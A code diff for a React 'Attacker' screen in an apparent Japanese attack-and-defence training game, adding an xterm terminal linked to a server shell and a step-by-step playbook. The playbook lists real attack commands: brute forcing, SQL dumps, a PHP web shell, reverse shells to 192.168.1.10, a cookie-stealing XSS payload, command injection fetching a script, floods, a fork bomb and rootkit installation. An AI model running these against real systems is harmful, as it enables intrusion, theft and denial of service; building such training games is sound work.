@@ -1,15 +1,12 @@
 import { useState, useEffect, useRef } from 'react';
 import { Socket } from 'socket.io-client';
 import { useLocation, useNavigate } from 'react-router-dom';
+import { Terminal } from '@xterm/xterm';
+import { FitAddon } from '@xterm/addon-fit';
+import '@xterm/xterm/css/xterm.css';
 
 interface AttackerProps {
     socket: Socket | null;
-}
-
-interface TerminalLine {
-    id: string;
-    text: string;
-    type: 'cmd' | 'output' | 'success' | 'error' | 'warn' | 'system';
 }
 
 type GamePhase = 'WAITING' | 'IDLE' | 'ATTACKING' | 'ATTACK_SUCCESS' | 'BLOCKED' | 'COMPLETED';
@@ -34,51 +31,91 @@ const ATTACKS = [
     { id: 'rootkit', name: 'LKM Rootkit', desc: 'マルウェアのプロセスやポートをカーネルレベルで隠蔽' },
 ];
 
-function uid() { return Math.random().toString(36).slice(2, 9); }
-
-function TermLine({ line }: { line: TerminalLine }) {
-    const colors: Record<string, string> = {
-        cmd: 'text-green-400',
-        output: 'text-slate-300',
-        success: 'text-cyan-400',
-        error: 'text-red-400',
-        warn: 'text-yellow-400',
-        system: 'text-purple-400',
-    };
-    return (
-        <div className={`font - mono text - sm leading - relaxed whitespace - pre - wrap ${colors[line.type]} `}>
-            {line.type === 'cmd' && <span className="text-green-600 mr-1">$</span>}
-            {line.text}
-        </div>
-    );
-}
+const ATTACK_STEPS: Record<string, string[]> = {
+    'ssh': ['nmap 192.168.1.100', 'hydra -l admin -P pass.txt ssh://192.168.1.100', 'ssh admin@192.168.1.100'],
+    'sqli': ['curl http://192.168.1.100/login', 'sqlmap -u "http://192.168.1.100/login?id=1" --dbs', 'sqlmap -u "..." -D public --dump'],
+    'ddos': ['ping -c 1 192.168.1.100', 'slowhttptest -c 1000 -u http://192.168.1.100', 'ab -n 10000 -c 1000 http://192.168.1.100/'],
+    'ransomware': ['msfconsole', 'use exploit/multi/handler', 'exploit -j', 'run ransomware'],
+    'rce': ['nikto -h http://192.168.1.100', 'curl -X POST http://192.168.1.100/upload -d "<?php system($_GET[\'cmd\']); ?>"', 'curl "http://192.168.1.100/upload/shell.php?cmd=nc -e /bin/bash 192.168.1.10 4444"'],
+    'xss': ['curl -X POST http://192.168.1.100/comment -d "<script>fetch(\'http://192.168.1.10/log?cookie=\'+document.cookie)</script>"', 'nc -lvnp 80', 'curl -H "Cookie: session_id=admin_token" http://192.168.1.100/admin'],
+    'oscmd': ['curl "http://192.168.1.100/ping?ip=127.0.0.1;id"', 'curl "http://192.168.1.100/ping?ip=127.0.0.1;wget http://192.168.1.10/bd.sh"', 'curl "http://192.168.1.100/ping?ip=127.0.0.1;bash bd.sh"'],
+    'ftp': ['nmap -p 21 192.168.1.100', 'ftp 192.168.1.100', 'put malware.exe', 'site exec malware.exe'],
+    'nmap': ['ssh target@192.168.1.100', 'nmap -sn 10.0.0.0/24', 'nmap -p- 10.0.0.5'],
+    'privesc': ['ssh user@192.168.1.100', 'sudo -l', 'sudo /bin/bash'],
+    'synflood': ['hping3 -S --flood -V -p 80 192.168.1.100'],
+    'dnsamp': ['nmap -sU -p 53 --script=dns-recursion 8.8.8.8', 'hping3 -q -n -a 192.168.1.100 --udp -p 53 8.8.8.8'],
+    'forkbomb': ['ssh user@192.168.1.100', ':(){ :|:& };:'],
+    'slowloris': ['nmap -p 80 192.168.1.100', 'slowloris 192.168.1.100'],
+    'cron': ['ssh root@192.168.1.100', 'echo "* * * * * nc -e /bin/bash 192.168.1.10 4444" > /tmp/cronjob', 'crontab /tmp/cronjob'],
+    'sshkey': ['ssh-keygen -t rsa -f mykey', 'scp mykey.pub root@192.168.1.100:/root/.ssh/authorized_keys'],
+    'rootkit': ['ssh root@192.168.1.100', 'git clone https://github.com/mfontanini/diamorphine', 'cd diamorphine && make', 'insmod diamorphine.ko'],
+};
 
 export function Attacker({ socket }: AttackerProps) {
     const navigate = useNavigate();
     const location = useLocation();
     const roomId = new URLSearchParams(location.search).get('room') || 'UNKNOWN_ROOM';
 
-    const [terminalOutput, setTerminalOutput] = useState<TerminalLine[]>([]);
     const [phase, setPhase] = useState<GamePhase>('WAITING');
-    const [busy, setBusy] = useState(false);
     const [target] = useState('192.168.1.100');
     const [selectedAttack, setSelectedAttack] = useState<string>('ssh');
     const [isBlocked, setIsBlocked] = useState(false);
-    const bottomRef = useRef<HTMLDivElement>(null);
+    const [winner, setWinner] = useState<'attacker' | 'defender' | null>(null);
 
-    const addLine = (text: string, type: TerminalLine['type'] = 'output') => {
-        setTerminalOutput(prev => [...prev, { id: uid(), text, type }]);
+    const terminalRef = useRef<HTMLDivElement>(null);
+    const xtermRef = useRef<Terminal | null>(null);
+    const fitAddonRef = useRef<FitAddon | null>(null);
+    const isXtermInitialized = useRef(false);
+
+    const writeXterm = (text: string, colorCode: string = '') => {
+        if (!xtermRef.current) return;
+        const textStr = colorCode ? `\x1b[${colorCode}m${text}\x1b[0m` : text;
+        const lines = textStr.split('\n');
+        lines.forEach((line, i) => {
+            xtermRef.current?.write(line + (i < lines.length - 1 ? '\r\n' : ''));
+        });
     };
 
-    const addLines = (texts: string[], type: TerminalLine['type'] = 'output') => {
-        const newLines = texts.map(text => ({ id: uid(), text, type }));
-        setTerminalOutput(prev => [...prev, ...newLines]);
-    };
-
-    // 自動スクロール
+    // xterm 初期化
     useEffect(() => {
-        bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
-    }, [terminalOutput]);
+        if (isXtermInitialized.current || !terminalRef.current) return;
+        isXtermInitialized.current = true;
+
+        const term = new Terminal({
+            cursorBlink: true,
+            theme: {
+                background: '#0a0a0a',
+                foreground: '#00ffcc', // Hacker green/cyan
+            }
+        });
+        const fitAddon = new FitAddon();
+        term.loadAddon(fitAddon);
+        term.open(terminalRef.current);
+        fitAddon.fit();
+
+        xtermRef.current = term;
+        fitAddonRef.current = fitAddon;
+
+        term.onData(data => {
+            if (socket) socket.emit('pty_input', { input: data });
+        });
+
+        const resizeObserver = new ResizeObserver(() => {
+            if (fitAddonRef.current && xtermRef.current) {
+                fitAddonRef.current.fit();
+                if (socket) {
+                    socket.emit('pty_resize', { cols: term.cols, rows: term.rows });
+                }
+            }
+        });
+        resizeObserver.observe(terminalRef.current);
+
+        return () => {
+            resizeObserver.disconnect();
+            term.dispose();
+            isXtermInitialized.current = false;
+        };
+    }, [socket]);
 
     // Socket イベントリスナー
     useEffect(() => {
@@ -93,79 +130,60 @@ export function Attacker({ socket }: AttackerProps) {
             // Handle disconnect
         });
 
+        socket.on('attacker_pty_output', (data) => {
+            xtermRef.current?.write(data.output);
+        });
+
         socket.on('game_state', (data) => {
             setPhase(data.phase);
             setIsBlocked(data.phase === 'BLOCKED');
+            if (data.phase === 'WAITING') {
+                writeXterm('\r\n[!] ターゲットへの接続待機中...\r\n', '35');
+            } else if (data.phase === 'IDLE') {
+                writeXterm('\r\n[!] ターゲットへの経路が確認されました。攻撃を選択してください。\r\n', '32');
+            }
         });
 
-        socket.on('attack_success', (data) => {
-            setBusy(false);
-            setPhase('ATTACK_SUCCESS');
-            addLines([
-                ``,
-                `[+] 攻撃成功: ${data.attackName}`,
-                `${data.detail}`,
-                ``,
-                `[*] フェーズ2: エクスプロイトを実行中...`,
-            ], 'success');
-
-            setTimeout(() => {
-                socket.emit('execute_exploit');
-                addLine(`[*] エクスプロイト ペイロード送信中...`, 'cmd');
-            }, 1500);
+        socket.on('attack_started', (data) => {
+            setPhase('ATTACKING');
+            writeXterm(`\r\n\r\n[+] 攻撃フェーズ開始: ${data.attackName}\r\n`, '32');
+            writeXterm(`[*] ${data.detail}\r\n`, '33');
+            writeXterm(`[*] 右パネルの手順書（Playbook）に従い、コマンドを入力して攻撃を進行させてください。\r\n\r\n`, '33');
         });
 
-        socket.on('exploit_success', (data) => {
+        socket.on('game_clear', (data) => {
             setPhase('COMPLETED');
-            addLines([
-                ``,
-                `[+] ${data.message}`,
-                ``,
-                `[*] 目的を達成しました。システムへの継続的アクセスを確立中...`,
-                `    防御側が対処するのを待ちます。`,
-            ], 'success');
-            setBusy(false);
+            setWinner(data.winner);
+            if (data.winner === 'attacker') {
+                writeXterm(`\r\n\r\n╔══════════════════════════════════════════════════════╗\r\n║  🔥 MISSION COMPLETE - SYSTEM COMPROMISED 🔥          ║\r\n║  ${data.message}  ║\r\n╚══════════════════════════════════════════════════════╝\r\n`, '32');
+            } else {
+                writeXterm(`\r\n\r\n╔══════════════════════════════════════════════════════╗\r\n║  ❌ MISSION FAILED - ATTACK BLOCKED       ❌          ║\r\n║  ${data.message}  ║\r\n╚══════════════════════════════════════════════════════╝\r\n`, '31');
+            }
         });
 
         socket.on('force_logout', (data) => {
             setIsBlocked(true);
-            addLines([
-                ``,
-                `${data.reason}`,
-                ``,
-                `*** すべての接続が切断されました ***`,
-            ], 'error');
-
-            if (phase === 'COMPLETED' || phase === 'ATTACK_SUCCESS') {
-                setTimeout(() => {
-                    addLines([
-                        ``,
-                        `[バックドア] 接続継続中...`,
-                        `[バックドア] nc 192.168.1.100:4444 - セッション維持`,
-                        `[バックドア] 情報の継続的な送信を続けています...`,
-                    ], 'warn');
-                }, 2000);
-            }
+            writeXterm(`\r\n\r\n[!] FATAL ERROR: ${data.reason}\r\n[!] すべての接続が切断されました。\r\n`, '31');
         });
 
         socket.on('blocked', () => {
             setIsBlocked(true);
-            addLine(`\nConnection refused: このIPはブロックされています。`, 'error');
-            setBusy(false);
+            writeXterm(`\r\n[!] Connection refused: このIPはブロックされています。\r\n`, '31');
         });
 
         socket.on('game_reset', () => {
-            setTerminalOutput([]);
+            xtermRef.current?.clear();
             setPhase('IDLE');
-            setBusy(false);
             setIsBlocked(false);
-            addLine('システムリセット完了。新しいセッションを開始できます。', 'system');
+            setWinner(null);
+            writeXterm('\r\nシステムリセット完了。新しいセッションを開始できます。\r\n', '35');
         });
 
         return () => {
+            socket.off('attacker_pty_output');
             socket.off('game_state');
-            socket.off('attack_success');
-            socket.off('exploit_success');
+            socket.off('attack_started');
+            socket.off('game_clear');
             socket.off('force_logout');
             socket.off('blocked');
             socket.off('game_reset');
@@ -176,22 +194,11 @@ export function Attacker({ socket }: AttackerProps) {
     // ─── フェーズごとのアクション ───────────────────────────
 
     const handleStartAttack = () => {
-        if (!socket || busy) return;
-        setBusy(true);
+        if (!socket) return;
         setPhase('ATTACKING');
-        const attackMeta = ATTACKS.find(a => a.id === selectedAttack);
-
-        addLine(`[*] 攻撃開始: ${attackMeta?.name}`, 'warn');
-        addLine(`[*] Target: ${target}`);
-        addLine(`[*] Exploit payload initialized...`, 'cmd');
-
-        // シンプルな待機アニメーション
-        const attempts = ['.', '..', '...', 'Payload injected', 'Waiting for response...'];
-        attempts.forEach((a, i) => {
-            setTimeout(() => addLine(a), (i + 1) * 600);
-        });
-
         socket.emit('start_attack', { attackType: selectedAttack });
+        // After starting, focus terminal so they can start typing
+        setTimeout(() => xtermRef.current?.focus(), 100);
     };
 
     const handleReset = () => {
@@ -224,14 +231,13 @@ export function Attacker({ socket }: AttackerProps) {
                     <span className="text-red-500 font-bold">▶ attacker@kali</span>
                     <span className="text-slate-500 text-xs">192.168.50.10</span>
                     <span className={`text-xs px-2 py-0.5 rounded-full font-bold ${isBlocked ? 'bg-red-900 text-red-300' :
-                        phase === 'COMPLETED' ? 'bg-yellow-900 text-yellow-300' :
-                            phase !== 'IDLE' ? 'bg-green-900 text-green-300' :
+                        phase === 'COMPLETED' ? (winner === 'attacker' ? 'bg-green-900 text-green-300' : 'bg-red-900 text-red-300') :
+                            phase !== 'IDLE' ? 'bg-yellow-900 text-yellow-300 animate-pulse' :
                                 'bg-slate-800 text-slate-400'
                         }`}>
                         {isBlocked ? '🚫 BLOCKED' :
-                            phase === 'COMPLETED' ? '🚪 EXPLOIT ACTIVE' :
-                                phase === 'ATTACK_SUCCESS' ? '✅ TARGET BREACHED' :
-                                    phase === 'ATTACKING' ? '⚡ ATTACKING...' : '⬤ IDLE'}
+                            phase === 'COMPLETED' ? (winner === 'attacker' ? '🏆 YOU WIN' : '💀 YOU LOSE') :
+                                phase === 'ATTACKING' ? '⚡ ATTACKING...' : '⬤ IDLE'}
                     </span>
                 </div>
                 <div className="flex items-center gap-4">
@@ -252,18 +258,8 @@ export function Attacker({ socket }: AttackerProps) {
                     <div className="bg-slate-900/30 px-3 py-1 text-xs text-slate-500 border-b border-slate-800">
                         Terminal — bash — 120×40
                     </div>
-                    <div className="flex-1 overflow-y-auto p-4 space-y-0.5 bg-black min-h-0"
-                        style={{ minHeight: 'calc(100vh - 120px)' }}>
-                        {terminalOutput.length === 0 && (
-                            <div className="text-slate-600 text-sm">
-                                {`Attacker Terminal v1.0 — Security Training Simulation\n[!] このセッションは研修目的のシミュレーションです\n\n右パネルから攻撃フェーズを選択してください。`}
-                            </div>
-                        )}
-                        {terminalOutput.map((l: TerminalLine) => <TermLine key={l.id} line={l} />)}
-                        {busy && (
-                            <div className="text-green-500 animate-pulse text-sm">▊</div>
-                        )}
-                        <div ref={bottomRef} />
+                    <div className="flex-1 p-4 bg-[#0a0a0a]" style={{ minHeight: 'calc(100vh - 120px)' }}>
+                        <div ref={terminalRef} className="w-full h-full" style={{ overflow: 'hidden' }} />
                     </div>
                 </div>
 
@@ -291,16 +287,34 @@ export function Attacker({ socket }: AttackerProps) {
                         </div>
 
                         <div className="pt-2 border-t border-slate-800 mt-2">
-                            <button
-                                onClick={handleStartAttack}
-                                disabled={phase !== 'IDLE' || busy || isBlocked}
-                                className="w-full text-xs font-bold bg-red-950 hover:bg-red-900 border border-red-900 disabled:bg-slate-900 disabled:border-slate-800 disabled:text-slate-600 text-red-400 py-2 rounded transition-colors"
-                            >
-                                {phase !== 'IDLE' ? '攻撃実行済み' : '▶ 攻撃を実行'}
-                            </button>
+                            {phase === 'IDLE' ? (
+                                <button
+                                    onClick={handleStartAttack}
+                                    disabled={phase !== 'IDLE' || isBlocked}
+                                    className="w-full text-xs font-bold bg-red-950 hover:bg-red-900 border border-red-900 text-red-400 py-2 rounded transition-colors"
+                                >
+                                    ▶ 攻撃を開始
+                                </button>
+                            ) : (
+                                <div className="p-3 bg-red-950/20 border border-red-900/50 rounded">
+                                    <h3 className="text-red-400 font-bold text-xs mb-2">🔥 Playbook (実行手順)</h3>
+                                    <div className="text-slate-300 text-[10px] mb-3 leading-relaxed">
+                                        以下のコマンドを順番にターミナルに入力し、防衛側より早く攻撃を完了させてください！
+                                    </div>
+                                    <div className="space-y-2">
+                                        {ATTACK_STEPS[selectedAttack]?.map((cmd, i) => (
+                                            <div key={i} className="bg-black border border-slate-800 p-2 rounded relative group">
+                                                <div className="text-slate-500 text-[9px] mb-1">Step {i + 1}</div>
+                                                <code className="text-green-400 text-[10px] break-all">{cmd}</code>
+                                            </div>
+                                        ))}
+                                    </div>
+                                </div>
+                            )}
+
                             {phase === 'COMPLETED' && (
-                                <div className="text-center text-[10px] text-green-500 mt-2 animate-pulse">
-                                    [継続アクセス確立中]
+                                <div className={`text-center text-xs mt-3 p-2 border rounded font-bold ${winner === 'attacker' ? 'bg-green-950/50 border-green-900 text-green-400' : 'bg-red-950/50 border-red-900 text-red-400'}`}>
+                                    {winner === 'attacker' ? '🏆 攻撃完遂 (勝利)' : '💀 攻撃失敗 (敗北)'}
                                 </div>
                             )}
                         </div>
